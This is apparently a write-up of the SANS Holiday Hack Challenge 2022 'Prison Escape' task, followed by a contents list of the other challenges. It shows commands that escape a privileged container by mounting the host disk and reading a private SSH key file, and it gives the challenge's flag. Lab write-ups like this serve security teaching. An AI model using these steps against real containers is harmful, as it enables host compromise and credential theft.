# SANS Holiday Hack Challenge 2022 - KringleCon V: Golden Rings
## Recover the Elfen Ring
### Prison Escape
Difficulty: :christmas_tree::christmas_tree::christmas_tree:  
Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex
string appears in the host file `/home/jailer/.ssh/jail.key.priv`?

#### Hints
##### Mount Up and Ride
*From: Bow Ninecandle*  
Were you able to mount up? If so, users' `home/` directories can be a great place to look for secrets...
##### Over-Permissioned
*From: Bow Ninecandle*  
When users are over-privileged, they can often act as root. When containers have too many [permissions](https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/), they can affect the host!

#### Solution
Literally, the first thing I did was try `sudo`, and it worked. I then spent some time poking around the container eventually noticing the `/dev/vda` disk:
```bash
grinchum-land:~# fdisk -l
Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
2048 cylinders, 64 heads, 32 sectors/track
Units: sectors of 1 * 512 = 512 bytes
Disk /dev/vda doesn't contain a valid partition table
```
Considering the hint about `mount`, I just tried to mount `/dev/vda`, exposing a linux root file structure:
```bash
grinchum-land:~# mount /dev/vda /mnt
grinchum-land:~# mount | grep vda
/dev/vda on /mnt type ext4 (rw,relatime)
grinchum-land:~# ls /mnt
bin boot dev etc home lib lib32 lib64
root run sbin srv sys tmp usr var
libx32
lost+found
media
mnt
opt
proc
```
At that point it was pretty straightforward to find and read the flag file:
```bash
grinchum-land:~$ cat /mnt/home/jailer/.ssh/jail.key.priv | tail -n 11 | head -n 1 | cut -d "
" -f 11
082bb339ec19de4935867
```
The solution is the string `082bb339ec19de4935867` in the above output.  
![root](imgs/root.png)  
[https://imgur.com/sQOrznY](https://imgur.com/sQOrznY)

---
## Recover the Elfen Ring
### Clone with a Difference
### Prison Escape
### Jolly CI/CD
### The Elfen Ring
## Recover the Web Ring
### Naughty IP
### Credential Mining
### 404 FTW
### IMDS, XXE, and Other Abbreviations
### Open Boria Mine Door
### Glamtariel's Fountain
### The Web Ring
## Recover the Cloud Ring
### AWS CLI Intro
### Trufflehog Search
### Exploitation via AWS CLI
## Recover the Burning Ring of Fire
### Buy a Hat
### Blockchain Divination
### Exploit a Smart Contract
### Mistakes were made... the key
### The Burning Ring of Fire
## [Narrative](/README.md#narrative)
## [Conclusions](/README.md#conclusions)
### [The Victors shop](/README.md#the-victors-shop)
### [Inbox (1)](/README.md#inbox-1)
---
## [thedead@dellian:~$ whoami](/README.md#thedeaddellian-whoami)
## KringleCon Orientation
## Recover the Tolkien Ring